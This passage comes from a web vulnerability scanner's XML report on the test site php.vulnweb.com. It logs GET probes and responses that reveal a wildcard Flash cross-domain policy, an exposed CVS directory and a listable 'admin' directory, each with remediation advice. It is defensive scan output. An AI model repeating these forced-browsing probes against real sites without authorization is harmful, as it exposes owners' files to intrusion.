]]></AttackHTTPRequest><VulnerabilityID>10242</VulnerabilityID><Severity>0</Severity><Name>Flash Cross-Domain Policy File</Name><Classifications><Classification kind="CWE" identifier="CWE-425" href="http://cwe.mitre.org/data/definitions/425.html">CWE-425: Direct Request ('Forced Browsing')</Classification><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected File" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected File</Classification></Classifications><DetectionSelection><Location offset="446" length="21" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A Flash cross-domain policy was found.  This file is used to control what third-party domains can access the various Flash components/services hosted on a web server.  When hosting Flash applications for third-parties or customers, the policy file can act as a list of established business relationships, thus resulting in a mild form of information disclosure.  Recommendations include reviewing the contents of the cross-domain policy file to ensure the listed domains do not disclosure non-public business relationships.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Using a web browser, make a request for the /crossdomain.xml file.]]></SectionText></ReportSection></Issue></Issues><RawRequest id="5564A005D4DBE8A338ECD84842C68F1B"><![CDATA[GET /crossdomain.xml HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="5564A005D4DBE8A338ECD84842C68F1B";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="63a283c6-6b75-41e3-b0c2-d7b0821c2902";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10242";Engine="Fixed";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="39";smi="0";sc="1";ID="44d5acdb";
X-Request-Memo: ID="ac807dc2";sc="1";tid="45";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:45:34 GMT
ETag: "504f12be-e0"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: text/xml
Accept-Ranges: bytes
Last-Modified: Tue, 11 Sep 2012 10:30:22 GMT
Content-Length: 224

<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
<allow-access-from domain="*" to-ports="*" secure="false"/>
</cross-domain-policy>]]></RawResponse><Request id="5564A005D4DBE8A338ECD84842C68F1B"><Method>GET</Method><Path>/</Path><File>crossdomain</File><Ext>xml</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="5564A005D4DBE8A338ECD84842C68F1B";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="63a283c6-6b75-41e3-b0c2-d7b0821c2902";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10242";Engine="Fixed";SmartMode="4";tid="17";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="39";smi="0";sc="1";ID="44d5acdb";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="ac807dc2";sc="1";tid="45";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
<allow-access-from domain="*" to-ports="*" secure="false"/>
</cross-domain-policy>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:45:34 GMT</Value></Header><Header><Name>ETag</Name><Value>"504f12be-e0"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Tue, 11 Sep 2012 10:30:22 GMT</Value></Header><Header><Name>Content-Length</Name><Value>224</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="A4B326723D7265ED642A37A96455EB1C"><URL>http://php.vulnweb.com:80/CVS/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="4b648e15-53fd-468f-999c-c1b75fc4f6c4"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>3850</EngineType><AttackHTTPRequest><![CDATA[GET /CVS/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="A4B326723D7265ED642A37A96455EB1C";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="60b8f839-2e70-4177-8e47-f305852be435";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11576";Engine="Site+Search";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="45";smi="0";sc="1";ID="da81b140";
X-Request-Memo: ID="04e90d66";sc="1";tid="48";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>11576</VulnerabilityID><Severity>1</Severity><Name>CVS Directory</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected Directory" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected Directory</Classification><Classification kind="CWE" identifier="CWE-527" href="https://cwe.mitre.org/data/definitions/527.html">CWE-527: Exposure of CVS Repository to an Unauthorized Control Sphere</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Development-related directory - <b>cvs</b> was discovered within your web application during a Site Search scan.  Risks associated with an attacker discovering a directory on your application server depend upon what type of directory is discovered, and what types of files are contained within it.  The primary threat other than accessing files containing sensitive information, is that an attacker can utilize the information discovered in that directory to perform other types of attacks.  Recommendations include removing any source code directories and repositories from the production server, disabling the use of remote repositories, and ensuring that the latest patches and version updates have been performed on the version control system being used  Additionally, restrict access to important directories or files by adopting a "need to know" requirement for both the document and server root, and turning off features such as Automatic Directory Listings that provide information that could be utilized by an attacker when formulating or conducting an attack.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
An attacker may use the internal information obtained from the source code files to craft a precise attack against the web application. Such attacks can include, but are not limited to, SQL injection, remote file system access, malware injection and database manipulation.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[Browse to ~FullURL~ and inspect the content. Response should return with HTTP status code 200 and should not match target site’s file not found response.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations:</b><br />
You should evaluate the production requirements for the found directory.  If the directory is not required for production operation, then the directory and its contents should be removed or restricted by a server access control mechanism.  More information about implementing access control schemes can be found in the References.  Automatic directory indexing should also be disabled, if applicable.

<br /><br /><b>For Development:</b><br />
This problem will be resolved by the web application server administrator.    In general, remove all source code repositories and files from the production server and do not rely on 'hidden' directories within the web root that can contain sensitive resources or web applications.  Assume an attacker knows about the existence of all directories and files on your web site, and protect them with proper access controls.

<br /><br /><b>For QA:</b><br />
This problem will be resolved by the web application  server administrator.]]></SectionText></ReportSection></Issue></Issues><RawRequest id="A4B326723D7265ED642A37A96455EB1C"><![CDATA[GET /CVS/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="A4B326723D7265ED642A37A96455EB1C";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="60b8f839-2e70-4177-8e47-f305852be435";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11576";Engine="Site+Search";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="45";smi="0";sc="1";ID="da81b140";
X-Request-Memo: ID="04e90d66";sc="1";tid="48";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:45:34 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html
Content-Length: 595

<html>
<head><title>Index of /CVS/</title></head>
<body>
<h1>Index of /CVS/</h1><hr><pre><a href="../">../</a>
<a href="Entries">Entries</a>                                            11-May-2011 10:27                   1
<a href="Entries.Log">Entries.Log</a>                                        11-May-2011 10:27                   1
<a href="Repository">Repository</a>                                         11-May-2011 10:27                   8
<a href="Root">Root</a>                                               11-May-2011 10:27                   1
</pre><hr></body>
</html>
]]></RawResponse><Request id="A4B326723D7265ED642A37A96455EB1C"><Method>GET</Method><Path>/CVS/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="A4B326723D7265ED642A37A96455EB1C";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="60b8f839-2e70-4177-8e47-f305852be435";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11576";Engine="Site+Search";SmartMode="4";tid="17";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="45";smi="0";sc="1";ID="da81b140";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="04e90d66";sc="1";tid="48";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html>
<head><title>Index of /CVS/</title></head>
<body>
<h1>Index of /CVS/</h1><hr><pre><a href="../">../</a>
<a href="Entries">Entries</a>                                            11-May-2011 10:27                   1
<a href="Entries.Log">Entries.Log</a>                                        11-May-2011 10:27                   1
<a href="Repository">Repository</a>                                         11-May-2011 10:27                   8
<a href="Root">Root</a>                                               11-May-2011 10:27                   1
</pre><hr></body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:45:34 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Content-Length</Name><Value>595</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="0033243C546564EDDF3CDD925F77F630"><URL>http://php.vulnweb.com:80/admin/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="b74d2b0f-8f0d-4dd6-be65-09a693631202"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>3850</EngineType><AttackHTTPRequest><![CDATA[GET /admin/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="0033243C546564EDDF3CDD925F77F630";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="60b8f839-2e70-4177-8e47-f305852be435";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10810";Engine="Site+Search";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="b1ae0088";
X-Request-Memo: ID="453d6334";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>10810</VulnerabilityID><Severity>1</Severity><Name>"Admin" Directory</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected Directory" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected Directory</Classification><Classification kind="CWE" identifier="CWE-552" href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A directory named 'admin' was  discovered within your web application. Risks associated with an attacker discovering an administrative directory on your application server typically include the potential for the attacker to use the administrative applications to affect the operations of the web site.  Recommendations include restricting access to important directories or files by adopting a "need to know" requirement for both the document and server root, and turning off features such as Automatic Directory Listings that provide information that could be utilized by an attacker when formulating or conducting an attack. ]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br /> Administrative directories typically contain applications capable of changing the configuration of the running software; an attacker who gains access to an administrative application can drastically affect the operation of the web site.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations:</b><br />
You should evaluate the production requirements for the found directory.  If the directory is not required for production operation, then the directory and its contents should be removed or restricted by a server access control mechanism.  More information about implementing access control schemes can be found in the References.  Automatic directory indexing should also be disabled, if applicable.

<br /><br /><b>For Development:</b><br />
This problem will need to be resolved by the web application  server administrator.  In general, do not rely on 'hidden' directories within the web root that can contain sensitive resources or web applications.  Assume an attacker knows about the existence of all directories and files on your web site, and protect them with proper access controls.

<br /><br /><b>For QA:</b><br />
This problem will be resolved by the web application server administrator.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Implementing Basic Authentication in IIS</b><br /><a href="http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/abbca505-6f63-4267-aac1-1ea89d861eb4.mspx">http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/a

bbca505-6f63-4267-aac1-1ea89d861eb4.mspx</a><br /><br /><b>Authentication, Authorization and Access Control</b><br /><a href="http://httpd.apache.org/docs/2.0/howto/auth.html">http://httpd.apache.org/docs/2.0/howto/auth.html</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="0033243C546564EDDF3CDD925F77F630"><![CDATA[GET /admin/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="0033243C546564EDDF3CDD925F77F630";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="60b8f839-2e70-4177-8e47-f305852be435";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10810";Engine="Site+Search";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="b1ae0088";
X-Request-Memo: ID="453d6334";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:45:35 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html
Content-Length: 262

<html>
<head><title>Index of /admin/</title></head>
<body>
<h1>Index of /admin/</h1><hr><pre><a href="../">../</a>
<a href="create.sql">create.sql</a>                                         11-May-2011 10:27                 523
</pre><hr></body>
</html>
]]></RawResponse><Request id="0033243C546564EDDF3CDD925F77F630"><Method>GET</Method><Path>/admin/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="0033243C546564EDDF3CDD925F77F630";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="60b8f839-2e70-4177-8e47-f305852be435";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10810";Engine="Site+Search";SmartMode="4";tid="17";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="29";smi="0";sc="1";ID="b1ae0088";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="453d6334";sc="1";tid="40";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html>
<head><title>Index of /admin/</title></head>
<body>
<h1>Index of /admin/</h1><hr><pre><a href="../">../</a>
<a href="create.sql">create.sql</a>                                         11-May-2011 10:27                 523
</pre><hr></body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:45:35 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Content-Length</Name><Value>262</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="0D8FDC53A047151D0EFC5EB65C0890A6"><URL>http://php.vulnweb.com:80/CVS/Entries</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="0D8FDC53A047151D0EFC5EB65C0890A6"><![CDATA[GET /CVS/Entries HTTP/1.1
Referer: http://php.vulnweb.com/CVS/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="0D8FDC53A047151D0EFC5EB65C0890A6";PSID="A4B326723D7265ED642A37A96455EB1C";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="07736b7f";
X-Request-Memo: ID="98a5f382";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:45:36 GMT
ETag: "4dca64a4-1"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: application/octet-stream
Accept-Ranges: bytes
Last-Modified: Wed, 11 May 2011 10:27:48 GMT
Content-Length: 1

 ]]></RawResponse><Request id="0D8FDC53A047151D0EFC5EB65C0890A6"><Method>GET</Method><Path>/CVS/</Path><File>Entries</File><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/CVS/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="0D8FDC53A047151D0EFC5EB65C0890A6";PSID="A4B326723D7265ED642A37A96455EB1C";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="07736b7f";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="98a5f382";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[ ]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:45:36 GMT</Value></Header><Header><Name>ETag</Name><Value>"4dca64a4-1"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>application/octet-stream</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Wed, 11 May 2011 10:27:48 GMT</Value></Header><Header><Name>Content-Length</Name><Value>1</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="567EB72484F89E6328D4C302F1EFEABD"><URL>http://php.vulnweb.com:80/CVS/Entries.Log</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="567EB72484F89E6328D4C302F1EFEABD"><![CDATA[GET /CVS/Entries.Log HTTP/1.1
Referer: http://php.vulnweb.com/CVS/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="567EB72484F89E6328D4C302F1EFEABD";PSID="A4B326723D7265ED642A37A96455EB1C";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="c84a871a";
X-Request-Memo: ID="07493a18";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:45:36 GMT
ETag: "4dca64a4-1"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: application/octet-stream
Accept-Ranges: bytes
Last-Modified: Wed, 11 May 2011 10:27:48 GMT
Content-Length: 1

 ]]></RawResponse><Request id="567EB72484F89E6328D4C302F1EFEABD"><Method>GET</Method><Path>/CVS/</Path><File>Entries</File><Ext>Log</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/CVS/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="567EB72484F89E6328D4C302F1EFEABD";PSID="A4B326723D7265ED642A37A96455EB1C";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="c84a871a";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="07493a18";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[ ]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web 